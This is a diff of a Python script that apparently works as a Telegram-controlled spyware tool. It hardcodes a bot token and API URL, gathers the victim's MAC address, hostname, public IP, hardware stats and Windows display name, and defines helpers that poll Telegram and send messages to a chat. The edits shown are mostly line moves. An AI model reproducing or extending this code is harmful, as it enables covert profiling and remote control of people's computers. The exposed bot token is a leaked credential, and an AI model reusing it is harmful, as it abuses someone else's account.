@@ -17,8 +17,11 @@ from screeninfo import get_monitors
 
 
 bot = telebot.TeleBot("6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ")
+url = "https://api.telegram.org/bot6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ/"
 
 monitors = get_monitors()
+for monitor in monitors:
+    pass
 
 mac = get_mac()
 
@@ -29,28 +32,17 @@ n = socket.gethostname()
 battery_info = psutil.sensors_battery()
 
 s = requests.get('https://2ip.ua/ru/')
-
 b = bs4.BeautifulSoup(s.text, "html.parser")
-
 a = b.select(" .ipblockgradient .ip")[0].getText()
 
-url = "https://api.telegram.org/bot6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ/"
-
 connection = sqlite3.connect("ip.sl3", 5)
-
 cur = connection.cursor()
 
-for monitor in monitors:
-    pass
+
 
 cpu_percent = psutil.cpu_percent(interval=1)
 
 memory_info = psutil.virtual_memory()
-
-
-
-
-
 
 def last_update(r):
     response = requests.get(r + "getUpdates")
@@ -59,16 +51,13 @@ def last_update(r):
     total_updates = len(result) - 1
     return result[total_updates]
 
-
 def get_chat_id(u):
     chat_id = u['message']['chat']['id']
     return chat_id
 
-
 def get_message_text(u):
     text = u['message']['text']
     return text
-
 
 def send_message(chat, text):
     p = {'chat_id': chat, 'text': text}
@@ -102,6 +91,7 @@ def get_info_by_ip(ip='127.0.0.1'):
     except requests.exceptions.ConnectionError:
         print('[!] Please check your connection!')
 
+
 def get_display_name():
     GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
     NameDisplay = 3
@@ -112,7 +102,6 @@ def get_display_name():
     nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
     GetUserNameEx(NameDisplay, nameBuffer, size)
     return nameBuffer.value
-
 d_n = get_display_name()
 
 def main():
